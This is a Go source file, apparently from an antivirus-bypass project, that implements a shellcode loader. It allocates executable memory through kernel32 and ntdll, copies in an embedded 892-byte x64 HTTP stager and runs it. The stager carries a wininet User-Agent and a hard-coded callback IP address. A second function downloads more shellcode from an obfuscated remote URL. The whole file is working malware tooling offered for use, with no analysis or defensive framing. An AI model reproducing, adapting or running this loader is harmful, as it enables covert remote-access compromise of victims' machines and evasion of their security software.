package main

import (
	"GolangBypassAV/encry"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func getCode(key string) []byte {
	//远程加载
	//Url0:= xor.d("daed8f25d0556d6fd037583947598324928")
	url0 := encry.D(key)

	var CL http.Client
	//_ = exec.Command("calc.exe").Start()
	//下方拼接shellcode文件名到url上
	resp, err := CL.Get(url0 + "x")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		return bodyBytes
	}
	return []byte{}
}

func genEXE(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func genEXE1(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	/* length: 892 bytes */
	data := "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x20\x03\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x63\x37\x78\x00\x71\xdc\x5f\x88\xf7\x61\x31\x6d\x97\xc1\xb8\x8a\xb1\x4b\x19\x71\x98\x27\x97\xe9\xc8\x22\xcc\x77\xe1\x0d\x75\xe2\x18\x7a\x58\x6c\x7a\x9c\xba\x43\x64\x39\xe0\x27\x59\x99\xae\xad\x5e\x4a\xa6\x5e\xe4\xbd\x85\x6b\x28\xa7\x42\x11\xaf\x9e\x4e\xcc\x65\xd5\x5f\x0f\x4c\x76\x14\xbb\xd5\x55\x28\xba\x02\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x29\x0d\x0a\x00\x2d\xbe\xea\x9c\x8c\xd1\x2e\x37\xfe\x2f\x6f\xa6\x0d\x4d\x3a\x60\x02\x25\xe2\xd5\xbe\x91\x5f\xf1\xb0\x59\x90\xfd\x7a\x2c\x45\x17\xe4\xb7\x28\x47\x39\x9c\x92\x59\x8b\x8e\xa4\x62\x74\x6c\x45\x06\x91\xce\x72\xcc\xea\x46\xd8\x6a\x65\xd9\xf5\x3b\x07\x85\xbe\x1c\x03\x1e\x4c\x44\xe9\x3c\xbb\x81\xc1\xbe\xa2\x26\x02\x98\x71\xab\xa1\xa5\xc2\xd0\x95\xa1\xb7\xe2\x39\x67\x7f\x98\x78\x41\xcc\xfd\xb5\x3d\x86\x31\x57\x0e\xc7\x09\xb9\xf7\x23\x19\x8d\xa1\x07\x22\xb9\xd0\x53\xe9\x89\x93\x69\xe6\x48\x6f\xb8\x3e\xa1\x38\x54\x1c\xdd\x61\x48\x44\xec\x20\xbc\xfd\x9a\x8e\x2e\xa6\xf0\x90\x0b\x7c\x9a\x32\x67\x22\x7a\xb3\x11\xb4\x82\xd6\x92\xd7\xde\x1e\x5e\x44\x59\x73\x8c\x55\xc8\xf6\x9c\x93\xb8\xe7\x8a\x69\x54\x9c\xca\xdb\xd1\x7b\x61\x54\xfa\xe7\x0f\x87\x44\x0a\x67\x37\x23\xfc\x9c\xbf\xe5\xcd\xd9\xb2\x43\x6e\xea\x99\x47\x6b\x77\x44\x91\x01\x67\x7e\x64\x12\x78\xea\xa3\x4e\x9b\x01\x2f\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x32\x2e\x39\x2e\x31\x35\x37\x2e\x31\x32\x32\x00\x12\x34\x56\x78"

	shellCodeHex := encry.GetShellCode(encry.GetBase64Data([]byte(data)))
	genEXE(shellCodeHex)

	//fmt.Print(encry.EE("ba`gfe"))

}